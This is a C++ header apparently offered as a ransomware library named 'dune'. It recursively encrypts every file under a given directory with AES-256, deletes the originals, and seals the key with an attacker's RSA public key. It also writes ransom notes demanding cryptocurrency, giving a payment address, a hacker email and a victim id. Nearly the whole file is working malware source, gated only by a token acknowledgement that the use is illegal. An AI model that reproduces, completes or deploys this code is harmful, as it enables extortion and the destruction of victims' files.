#ifndef __DUNE__
#define __DUNE__
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"

#include <string>
#include <thread>
#include <fstream>
#include <vector>
#include <filesystem>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/sha.h>
#include <openssl/pem.h>

namespace dune
{
    namespace tools
    {

        static std::string chars_to_hex(std::string data)
        {
            char const hex_chars[16] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
            std::string output;
            for (size_t i = 0; i < data.length(); ++i)
            {
                unsigned char const byte = data[i];

                output += hex_chars[(byte & 0xF0) >> 4];
                output += hex_chars[(byte & 0x0F) >> 0];
            }
            return output;
        }
        static std::string generate_uuid()
        {

            unsigned char buffer[16];
            int rc = RAND_bytes(buffer, 16);
            std::string tmp = chars_to_hex(std::string((const char *)buffer, 16));
            std::string result;
            for (int i = 0; i < 8; i++)
            {
                result += tmp[i];
            }
            result += "-";
            for (int i = 8; i < 12; i++)
            {
                result += tmp[i];
            }
            result += "-";
            for (int i = 12; i < 16; i++)
            {
                result += tmp[i];
            }
            result += "-";
            for (int i = 16; i < 20; i++)
            {
                result += tmp[i];
            }
            result += "-";
            for (int i = 20; i < 32; i++)
            {
                result += tmp[i];
            }
            return result;
        }
        static const std::string base64_chars =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz"
            "0123456789+/";

        static inline bool is_base64(unsigned char c)
        {
            return (isalnum(c) || (c == '+') || (c == '/'));
        }

        static std::string base64_encode(unsigned char const *buf, unsigned int bufLen)
        {
            std::string ret;
            int i = 0;
            int j = 0;
            unsigned char char_array_3[3];
            unsigned char char_array_4[4];

            while (bufLen--)
            {
                char_array_3[i++] = *(buf++);
                if (i == 3)
                {
                    char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                    char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                    char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                    char_array_4[3] = char_array_3[2] & 0x3f;

                    for (i = 0; (i < 4); i++)
                        ret += base64_chars[char_array_4[i]];
                    i = 0;
                }
            }

            if (i)
            {
                for (j = i; j < 3; j++)
                    char_array_3[j] = '\0';

                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;

                for (j = 0; (j < i + 1); j++)
                    ret += base64_chars[char_array_4[j]];

                while ((i++ < 3))
                    ret += '=';
            }

            return ret;
        }

        std::vector<unsigned char> base64_decode(std::string const &encoded_string)
        {
            int in_len = encoded_string.size();
            int i = 0;
            int j = 0;
            int in_ = 0;
            unsigned char char_array_4[4], char_array_3[3];
            std::vector<unsigned char> ret;

            while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_]))
            {
                char_array_4[i++] = encoded_string[in_];
                in_++;
                if (i == 4)
                {
                    for (i = 0; i < 4; i++)
                        char_array_4[i] = base64_chars.find(char_array_4[i]);

                    char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                    char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                    char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                    for (i = 0; (i < 3); i++)
                        ret.push_back(char_array_3[i]);
                    i = 0;
                }
            }

            if (i)
            {
                for (j = i; j < 4; j++)
                    char_array_4[j] = 0;

                for (j = 0; j < 4; j++)
                    char_array_4[j] = base64_chars.find(char_array_4[j]);

                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

                for (j = 0; (j < i - 1); j++)
                    ret.push_back(char_array_3[j]);
            }

            return ret;
        }
    };

    enum ATTACK_STATUS
    {
        SUCCESS,
        RUNNING,
        OPENSSL_ERROR,
        YOU_DID_NOW_ACCEPT,
        UNABLE_TO_WRITE_ALL_NOTES,
        CANT_FIND_HOME_DIR
    };
    /* All must be set to true or the program will terminate */
    struct Acknowledgement
    {
        bool are_you_sure_you_want_to_do_this;
        bool i_understand_it_is_illegel;
        bool i_accept_the_risks_and_consequences_of_my_actions;
    };
    class Dune
    {
    public:
        Dune(double _ransom_amount, std::string _crypto_currency_type, std::string _address, std::string _user_message, std::vector<std::string> _user_note_locations, std::string email_of_hacker, std::string rsa_public_key_pem_format_of_hacker_for_decryption)
        {
            public_key_pem = rsa_public_key_pem_format_of_hacker_for_decryption;
            ransom_amount = _ransom_amount;
            crypto_currency_type = _crypto_currency_type;
            address = _address;
            user_message = _user_message;
            user_notes_locations = _user_note_locations;
            hacker_email = email_of_hacker;
        };
        /* Must pass the Acknowledgement stucture */
        /* Creates thread use detatch to stop the hang up */
        ATTACK_STATUS attack(Acknowledgement agreement, std::string root_dir, bool detatch = false)
        {
            if (!(agreement.are_you_sure_you_want_to_do_this && agreement.i_accept_the_risks_and_consequences_of_my_actions && agreement.i_understand_it_is_illegel))
            {
                std::cout << "Oh, Well this is embarrassing..." << std::endl;
                return ATTACK_STATUS::YOU_DID_NOW_ACCEPT;
            }
            derive_key();
            encrypt_derived_key();
            if (write_note() != user_notes_locations.size())
            {
                return ATTACK_STATUS::UNABLE_TO_WRITE_ALL_NOTES;
            }
            std::thread encryptor(encrypt_files, plain_key, exempt_files, root_dir);
            plain_key.clear();
            if (detatch)
            {
                encryptor.detach();
                return ATTACK_STATUS::RUNNING;
            }
            else
            {
                encryptor.join();
                return ATTACK_STATUS::SUCCESS;
            }
        }
        bool verify_done()
        {
            std::ifstream check_file("finish.txt");
            bool status = !!check_file;
            if (status)
            {
                check_file.close();
                return true;
            }
            return false;
        }

    private:
        double ransom_amount;
        std::string hacker_email;
        std::string crypto_currency_type;
        std::string address;
        std::string user_message;
        std::vector<std::string> exempt_files;
        std::vector<std::string> user_notes_locations;
        std::string public_key_pem;
        std::string encrypted_key;
        std::string plain_key;
        void derive_key()
        {
            unsigned char buffer[32];
            int rc = RAND_bytes(buffer, 32);
            plain_key = std::string((const char *)buffer, sizeof(buffer));
        }
        std::string encryptWithPublicKey(const char *pData, int iLen)
        { // pData: String to encrypt, iLen: length

            char *chPublicKey = public_key_pem.data();
            BIO *bio = BIO_new_mem_buf(chPublicKey, -1);
            RSA *rsa = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
            int nLen = RSA_size(rsa);
            char *pEncode = (char *)malloc(nLen + 1);
            int rc = RSA_public_encrypt(iLen, (unsigned char *)pData, (unsigned char *)pEncode, rsa, RSA_PKCS1_PADDING);
            if (rc < 0)
            {
                char buf[128];
                std::cerr << "RSA_public_encrypt: " << ERR_error_string(ERR_get_error(), buf) << std::endl;
            }
            RSA_free(rsa);
            CRYPTO_cleanup_all_ex_data();
            std::string strName = std::string(pEncode, nLen);
            return strName;
        }
        void encrypt_derived_key()
        {
            encrypted_key = encryptWithPublicKey(plain_key.data(), plain_key.length());
        }
        static void ls_recursive(const std::filesystem::path &path, std::vector<std::string> *files)
        {
            for (const auto &p : std::filesystem::recursive_directory_iterator(path))
            {
                if (!std::filesystem::is_directory(p))
                {
                    files->push_back(p.path());
                }
            }
        }
        static std::string compute_file_hash(std::string fname)
        {
            std::ifstream fd;
            char buff[256];
            int i = 0;
            SHA_CTX sha_ctx;
            unsigned char sha1_hash[SHA_DIGEST_LENGTH];
            SHA1_Init(&sha_ctx);
            fd = std::ifstream(fname, std::ios_base::binary);
            do
            {
                i = fd.readsome(buff, 256);
                SHA1_Update(&sha_ctx, buff, i);
            } while (i > 0);
            fd.close();
            SHA1_Final(sha1_hash, &sha_ctx);

            return std::string((const char *)sha1_hash, SHA_DIGEST_LENGTH);
        }
        static void encrypt_file(std::string full_path, std::string enc_key)
        {
            FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
            if (!infile)
            {
                return;
            }

            FILE *outfile = fopen((full_path + ".dune").c_str(), "w+b");
            if (!outfile)
            {
                return;
            }
            int bytes_read, bytes_written;
            unsigned char indata[AES_BLOCK_SIZE];
            unsigned char outdata[AES_BLOCK_SIZE];
            unsigned char *ckey = (unsigned char *)enc_key.c_str();
            unsigned char ivec[] = "dontusethisinput";
            int num = 0;

            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            const EVP_CIPHER *cipher = EVP_aes_256_ctr();
            EVP_EncryptInit(ctx, cipher, ckey, ivec);
            while (1)
            {
                bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
                int outlen;
                EVP_EncryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
                bytes_written = fwrite(outdata, 1, bytes_read, outfile);
                if (bytes_read < AES_BLOCK_SIZE)
                    break;
            }
            EVP_CIPHER_CTX_free(ctx);
            EVP_CIPHER_free((EVP_CIPHER *)cipher);
            fclose(infile);
            fclose(outfile);
        }
        static void decrypt_file(std::string full_path, std::string enc_key)
        {
            FILE *infile = fopen(full_path.c_str(), "rb"); // must be open in read mode + binary
            if (!infile)
            {
                return;
            }

            FILE *outfile = fopen((full_path.substr(0, full_path.length() - 5)).c_str(), "w+b");
            if (!outfile)
            {
                return;
            }
            int bytes_read, bytes_written;
            unsigned char indata[AES_BLOCK_SIZE];
            unsigned char outdata[AES_BLOCK_SIZE];
            unsigned char *ckey = (unsigned char *)enc_key.c_str();
            unsigned char ivec[] = "dontusethisinput";
            int num = 0;

            EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
            const EVP_CIPHER *cipher = EVP_aes_256_ctr();
            EVP_DecryptInit(ctx, cipher, ckey, ivec);
            while (1)
            {
                bytes_read = fread(indata, 1, AES_BLOCK_SIZE, infile);
                int outlen;
                EVP_DecryptUpdate(ctx, outdata, &outlen, indata, bytes_read);
                bytes_written = fwrite(outdata, 1, bytes_read, outfile);
                if (bytes_read < AES_BLOCK_SIZE)
                    break;
            }
            EVP_CIPHER_CTX_free(ctx);
            EVP_CIPHER_free((EVP_CIPHER *)cipher);
            fclose(infile);
            fclose(outfile);
        }

        static void encrypt_files(std::string enc_key, std::vector<std::string> excluded_hashes, std::string user_home)
        {
            std::vector<std::string> files_to_encrypt;
            ls_recursive(user_home, &files_to_encrypt);
            if (files_to_encrypt.size() == 0)
            {
                return;
            }
            for (int i = 0; i < files_to_encrypt.size(); i++)
            {
                try
                {
                    bool skip = false;
                    std::string hash_to_check = compute_file_hash(files_to_encrypt[i]);
                    for (int j = 0; j < excluded_hashes.size(); j++)
                    {
                        if (hash_to_check == excluded_hashes[j])
                        {
                            skip = true;
                            break;
                        }
                    }
                    if (skip)
                    {
                        continue;
                    }
                    encrypt_file(files_to_encrypt[i], enc_key);
                    remove(files_to_encrypt[i].c_str());
                }
                catch (...)
                {
                }
            }
            std::ofstream finish("./finish.txt");
            char done_msg[] = "You are fuck!d...\n";
            finish.write(done_msg, sizeof(done_msg));
            finish.close();
            return;
        }
        static void decrypt_files(std::string enc_key, std::string user_home)
        {
            std::vector<std::string> files_to_decrypt;
            ls_recursive(user_home, &files_to_decrypt);
            if (files_to_decrypt.size() == 0)
            {
                return;
            }
            for (int i = 0; i < files_to_decrypt.size(); i++)
            {
                try
                {
                    decrypt_file(files_to_decrypt[i], enc_key);
                    remove((files_to_decrypt[i]).c_str());
                }
                catch (...)
                {
                }
            }
            std::ofstream finish("./finish.txt");
            char done_msg[] = "You made the right choice.\n";
            finish.write(done_msg, sizeof(done_msg));
            finish.close();
            return;
        }
        int write_note()
        {
            /*
             */
            std::string note = "Message from hacker: " + user_message + "\n\n";
            note += "You must pay in this type of cryptocurrency " + crypto_currency_type + ".\n";
            note += "The ransom amount is " + std::to_string(ransom_amount) + " " + crypto_currency_type + ".\n";
            note += "The address to pay is: \n\n" + address + "\n\n";
            note += "This address is specific to this attack. If you have multiple attacks paying another address will not help you get your files back. ";
            note += "The full amount or more must be paid to the " + crypto_currency_type + " address specified.\n";

            note += "DO NOT MODIFY THIS OR ALL YOUR FILES WILL BE LOST (It is the RSA encrypted key for decryption)\n\n" + dune::tools::base64_encode((unsigned char *)(encrypted_key.data()), encrypted_key.length()) + "\n\n";
            note += "Send this whole file to this email address AFTER you have paid the ransom: " + hacker_email + "\n\nIf you contact this email before the ransom is paid in full it will likely be increased.\n\n\n";
            note += "This is your victim id: " + dune::tools::generate_uuid() + ".\n";
            int success = 0;
            for (int i = 0; i < user_notes_locations.size(); i++)
            {
                try
                {
                    if (user_notes_locations[i].find(".txt") != std::string::npos)
                    {
                        std::ofstream file_to_write(user_notes_locations[i]);
                        file_to_write.write(note.c_str(), note.length());
                        file_to_write.close();
                        success++;
                    }
                }
                catch (...)
                {
                }
            }
            exempt_files.push_back(compute_file_hash(user_notes_locations[0]));
            return success;
        }
    };
}
#endif